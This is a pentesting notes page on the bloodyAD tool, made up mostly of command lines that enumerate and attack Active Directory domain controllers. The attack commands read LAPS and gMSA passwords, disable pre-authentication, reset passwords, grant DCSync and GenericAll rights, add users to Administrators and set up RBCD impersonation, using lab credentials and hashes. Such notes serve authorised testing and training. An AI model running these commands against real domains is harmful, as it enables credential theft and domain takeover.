---
title: BloodyAD
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/bloodyad
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

This tool can perform specific LDAP/SAMR calls to a domain controller in order to perform AD privesc.

***

## Enumerating using bloodyAD

BloodyAD uses the "get" function to get information from a DC:

```
# Get group members
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object Users --attr member

# Get minimum password length policy
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr minPwdLength

# Get AD functional level
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr msDS-Behavior-Version

# Get all users of the domain
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get children 'DC=bloody,DC=local' --type user

# Get all computers of the domain
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get children 'DC=bloody,DC=local' --type computer

# Get all containers of the domain
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get children 'DC=bloody,DC=local' --type container

# Get UserAccountControl flags
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 get object john.doe --attr userAccountControl

# Get AD DNS records
bloodyAD -u stan.dard -p Password123! -d bloody.local --host 192.168.10.2 get dnsDump

# Get user
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :70016778cb0524c799ac25b439bd6a31 get object administrator

# Get member of group
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :70016778cb0524c799ac25b439bd6a31 get object 'Domain Admins'
```

## Attacking AD using bloodyAD

We can also use bloodyAD to set/delete or add attributes & objects:

<pre><code># Enable DONT_REQ_PREAUTH for ASREPRoast
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 add uac john.doe DONT_REQ_PREAUTH

# Disable ACCOUNTDISABLE
bloodyAD -u Administrator -d bloody -p Password512! --host 192.168.10.2 remove uac john.doe ACCOUNTDISABLE

# Read GMSA account password
bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'gmsaAccount$' --attr msDS-ManagedPassword

# Read LAPS password
bloodyAD -u john.doe -d bloody -p Password512 --host 192.168.10.2 get object 'COMPUTER$' --attr ms-Mcs-AdmPwd

# Read quota for adding computer objects to domain
bloodyAD -u john.doe -d bloody -p Password512! --host 192.168.10.2 get object 'DC=bloody,DC=local' --attr ms-DS-MachineAccountQuota

# Add a new DNS entry
bloodyAD -u stan.dard -p Password123! -d bloody.local --host 192.168.10.2 add dnsRecord my_machine_name 192.168.10.48

# Remove a DNS entry
bloodyAD -u stan.dard -p Password123! -d bloody.local --host 192.168.10.2 remove dnsRecord my_machine_name 192.168.10.48

<strong># Set password for user
</strong>bloodyAD --host 172.16.1.15 -d bloody.local -u jane.doe -p :70016778cb0524c799ac25b439bd6a31 set password targetuser newpassword

# Add dcsync to object
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :0109d7e72fcfe404186c4079ba6cf79c add dcsync administrator

# Add GenericAll to object
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :0109d7e72fcfe404186c4079ba6cf79c add genericAll MS01$ administrator

# Add user to group
bloodyAD -d corp.local --host 172.16.1.5 -u Administrator -p :0109d7e72fcfe404186c4079ba6cf79c add groupMember 'Administrators' test

# Linking GPO
bloodyAD -d powercorp.local --host 10.10.1.128 -u incendium -p Incendium123 set object SRV01$ GPLink -v CN={2AADC2C9-C75F-45EF-A002-A22E1893FDB5},CN=POLICIES,CN=SYSTEM,DC=POWERCORP,DC=LOCAL
</code></pre>

## GenericWrite example

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FJGyYAZTjzzZzU5b43V8P%2Fimage.png?alt=media&amp;token=4640928c-ff86-459d-99f8-70bdeb71c638" alt=""><figcaption></figcaption></figure>

* User "joe" has GenericWrite to the DC02 machine account

We add rbcd or "Resource Based Constraint Delegation" for service on target, used to impersonate a user:

```
┌──(kali㉿kali)-[~/htb/offshore/172.16.2.6]
└─$ bloodyAD -d dev.admin.offshore.com --host 172.16.2.6 -u Joe -p :<nt-hash-joe> add rbcd DC02$ joe
[+] joe can now impersonate users on DC02$ via S4U2Proxy
```

We can now impersonate Administrator on DC02.
